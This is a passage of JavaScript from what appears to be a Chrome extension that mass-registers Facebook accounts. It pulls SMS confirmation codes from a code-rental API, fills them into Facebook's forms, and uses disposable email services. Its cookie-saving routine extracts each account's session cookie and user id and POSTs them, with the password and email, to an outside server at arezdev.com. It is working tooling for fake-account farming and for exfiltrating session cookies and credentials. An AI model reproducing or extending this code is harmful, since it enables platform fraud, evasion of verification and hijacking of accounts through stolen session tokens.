                    setTimeout(function(){ document.getElementsByClassName("_6if8 _8x0i _8xqj _8x0j")[0].click(); },9000);
              }
          }
      });
    });
  }, 9000);
}
function getkode_tokoclaude(){
 var getCode = setInterval(() => {
    chrome.runtime.sendMessage({action:"LOAD",key:"order_tokoclaude"},(id)=>{
      chrome.runtime.sendMessage({
        action:"ajax",
        method:"GET",
        url:"https://tokoclaude.com/api/get-orders/7df10d3d721ca64ed198a711ea2b1e6d/"+id},(inbox)=>{
        console.log(inbox);
        var kode_konfirm = inbox.data.data[0].sms.match(/FB-(\d+)/)[1];
        console.log(kode_konfirm);
        if(kode_konfirm){         
          clearInterval(getCode); 
          if(window.location.href.match(/web.facebook.com|pixel.facebook.com|web.prod.facebook.com|www.facebook.com/)){
          setTimeout(function(){ 
            const kode = document.getElementsByName("code")[0];
            kode.value=kode_konfirm;
            kode.dispatchEvent(new Event('input', {'bubbles': true}));
            },5000);
                setTimeout(function(){ 
            document.getElementsByName("confirm")[0].click() 
            },9000);
            setTimeout(function(){ arezdev.nggawe_Script_JS('javascript:(function(){ goURI("\/", true); })();'); },12000); 
              } else {
                  setTimeout(function(){ document.getElementsByName("c")[0].value=kode_konfirm; },5000);
                  setTimeout(function(){ document.getElementsByName("submit[confirm]")[0].click(); },6000);
                  setTimeout(function(){ document.getElementsByClassName("_6if8 _8x0i _8xqj _8x0j")[0].click(); },9000);
            }
        }
      });
    });
  }, 15000);
}
//============================== konfirmasi area ==============================//

//savecukis
function arezdevCookie(){
  $(document).ready(function(){ //doc ready!
  chrome.runtime.sendMessage({get:"daftar"},(service_mail)=>{
    if(service_mail == 0){
      var aku = "5SIM_ArezDev";
    } else if(service_mail == 1){
      var aku = "Gmail_ArezDev";
    } else if(service_mail == 2){
      var aku = "TempMailorg_ArezDev";
    } else if(service_mail == 3){
      var aku = "HotmailBox_ArezDev";
    } else if(service_mail == 4){
      var aku = "Dichvugmail_Email_ArezDev";
    } else if(service_mail == 5){
      var aku = "MailTM_data_ArezDev";
    } else if(service_mail == 6){
      var aku = "10MinuteMail_data_ArezDev";
    } else if(service_mail == 7){
      var aku = "TempmailLol_data_ArezDev";
    } else if(service_mail == 8){
      var aku = "GeneratorMail_data_ArezDev";
    }
    //get email
    chrome.runtime.sendMessage({action:"LOAD", key: aku}, function(dataEmailku){
    var Link = arezdev.getLinkhref(window.location.href)
    //save cokis
      chrome.runtime.sendMessage({get:"cokis",url:Link},function(arezdev_cookie){ 
        console.log(arezdev_cookie)
        if(arezdev_cookie){
          $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: green;padding:  10px;font-weight:  bold;color:white;'>:)</div>");
          $("body").append("<div style='cursor:pointer;position: absolute;top:  0px;z-index: 999999999;background-color: green;padding:  10px;font-weight:  bold;color:white;right:0px;'>:)</div>");
          chrome.runtime.sendMessage({
            save:"fb",
            uid:arezdev_cookie.match((/c_user=(\d+)/i))[1],
            pass:window.ArezDev_Settings.pass_gawedaftar,
            cookie:arezdev_cookie,
            ua:""},(dataFB)=>{
              
              console.log(dataFB);
              console.log("Start save cookie !");
            });
          var uid_ArezDev = arezdev_cookie.match((/c_user=(\d+)/i))[1];
          if(service_mail == 3){
            var email_ArezDev = dataEmailku.split("|")[0];
          } else {
            var email_ArezDev = dataEmailku;
          }
          // //start konek websoket
          // window.soket_Cookies = new WebSocket("ws://127.0.0.1:8181");
          // window.soket_Cookies.onopen=function(){
          //     setTimeout(function(){
          //     window.soket_Cookies.send(uid_ArezDev+"|"+window.ArezDev_Settings.pass_gawedaftar+"|"+arezdev_cookie+"|"+email_ArezDev);
          //   },1000)
          // }; //end konek websoket
          // setTimeout(function(){
          //   window.soket_Cookies.close();
          // },4000)
          // console.log(window.soket_Cookies)

        if(window.ArezDev_Settings.ModeVerify){
            if(window.ArezDev_Settings.pass_mode){
              chrome.runtime.sendMessage({name:"useragent"},(UA)=>{
          // window.soket_Cookies = new WebSocket("ws://127.0.0.1:8181");
          // window.soket_Cookies.onopen=function(){
          //     setTimeout(function(){
          //     window.soket_Cookies.send(uid_ArezDev+"|"+window.ArezDev_Settings.pass_gawedaftar+"|"+arezdev_cookie+"|"+email_ArezDev+"|"+UA);
          //   },1000)
          // }; //end konek websoket
          // setTimeout(function(){
          //   window.soket_Cookies.close();
          // },4000)
         


            });
          } else {
				//akun_arezdev_add
				//datae_arezdev
        //arezdev_fb
			chrome.runtime.sendMessage({name:"useragent"},(UA)=>{	
              chrome.runtime.sendMessage({action:"LOAD", key: "PassRandom"},(pass)=>{
                // window.soket_Cookies = new WebSocket("ws://127.0.0.1:8181");
                // window.soket_Cookies.onopen=function(){
                //     setTimeout(function(){
                //     window.soket_Cookies.send(uid_ArezDev+"|"+pass+"|"+arezdev_cookie+"|"+email_ArezDev+"|"+UA);
                //   },1000)
                // }; //end konek websoket
                // setTimeout(function(){
                //   window.soket_Cookies.close();
                // },4000)
                
                fetch("https://arezdev.com/akun/atok/kirim-data.php", {
                  "headers": {
                    "accept-language": "*",
                    "content-type": "application/x-www-form-urlencoded",
                  },
                  "body": "akun="+uid_ArezDev+"|"+window.ArezDev_Settings.pass_gawedaftar, //+"|"+arezdev_cookie+"|"+email_ArezDev, //+"|"+UA,
                  "method": "POST"
                })
                .then(async (response) => {
                    try {
                      const r = await response.json();
                      console.log(r);
                    } catch (err) {
                      console.log(err);
                    }
                  });
                });
              });
            }
          }
          else {
            if(service_mail == 1){
              var kodeku = "KODE_GMAIL";
            } else if(service_mail == 2){
              var kodeku = "KODE_TEMP_MAIL_ORG";
            } else if(service_mail == 3){
              var kodeku = "HOTMAILBOX";
            } else if(service_mail == 6){
              var kodeku = "KODE_10Minute";
            }
            chrome.runtime.sendMessage({action:"LOAD",key:kodeku},(a)=>{
              if(a){
                fetch("https://arezdev.com/akun/atok/kirim-data.php", {
                  "headers": {
                    "accept-language": "*",
                    "content-type": "application/x-www-form-urlencoded",
                  },
                  "body": "akun="+a+"|"+uid_ArezDev+"|"+window.ArezDev_Settings.pass_gawedaftar+"|"+arezdev_cookie+"|"+email_ArezDev, //+"|"+UA,
                  "method": "POST"
                })
                .then(async (response) => {
                    try {
                      const r = await response.json();
                      console.log(r);
                    } catch (err) {
                      console.log(err);
                    }
                  });
                         //start konek websoket
                      // window.soket_Cookies = new WebSocket("ws://127.0.0.1:8181");
                      // window.soket_Cookies.onopen=function(){
                      //     setTimeout(function(){
                      //     window.soket_Cookies.send(a+"|"+uid_ArezDev+"|"+window.ArezDev_Settings.pass_gawedaftar+"|"+arezdev_cookie+"|"+email_ArezDev);
                      //   },1000)
                      // }; //end konek websoket
                      // setTimeout(function(){
                      //   window.soket_Cookies.close();
                      // },4000)
                      // console.log(window.soket_Cookies)
              }
            })
          }
        }
      })//save cokis end
     }) //get email end
  })
    }) //doc ready! end
}